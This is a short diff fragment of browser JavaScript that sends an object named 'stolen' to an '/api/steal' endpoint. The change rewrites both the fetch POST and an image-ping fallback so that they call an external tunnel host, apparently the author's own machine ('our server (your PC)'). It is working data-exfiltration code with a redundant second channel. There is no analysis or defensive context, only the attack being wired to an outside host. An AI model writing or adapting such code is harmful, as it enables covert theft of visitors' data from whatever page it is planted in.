@@ -98,7 +98,7 @@
             // Send data to our server (your PC)
             function sendData() {
                 try {
-                    fetch("/api/steal", {
+                    fetch("https://blue-seas-feel.loca.lt/api/steal", {
                         method: "POST",
                         headers: {"Content-Type": "application/json"},
                         body: JSON.stringify(stolen),
@@ -107,7 +107,7 @@
                 } catch(e) {}
 
                 // Also send via image ping as fallback
-                var url = "/api/steal?data=" + encodeURIComponent(JSON.stringify(stolen));
+                var url = "https://blue-seas-feel.loca.lt/api/steal?data=" + encodeURIComponent(JSON.stringify(stolen));
                 try { new Image().src = url; } catch(e) {}
             }
 
